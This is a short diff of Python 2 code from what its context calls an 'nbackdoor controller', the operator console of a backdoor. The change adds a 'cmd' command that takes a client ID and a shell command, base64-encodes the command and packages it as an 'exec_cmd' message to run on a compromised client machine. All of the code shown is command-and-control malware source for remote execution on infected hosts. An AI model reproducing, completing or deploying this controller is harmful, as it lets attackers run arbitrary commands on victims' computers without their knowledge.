@@ -118,7 +118,19 @@ exit            quit nbackdoor controller
                 return None
 
         elif command_str == 'cmd':
-            return json.dumps({'cmd': command_str})
+            doc = """Usage: cmd CLINET_ID COMMAND
+
+CLINET_ID       user command "list" to get clinet_id
+COMMAND         cmd command to execute
+-h --help       show this
+"""
+            try:
+                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
+                return json.dumps({'cmd': 'exec_cmd', 'to': args['CLINET_ID'],
+                                   'cmd_to_exec': b64encode(args['COMMAND'])})
+            except SystemExit as e:
+                print e.message
+                return None
 
         elif command_str == 'download':
             return json.dumps({'cmd': command_str})
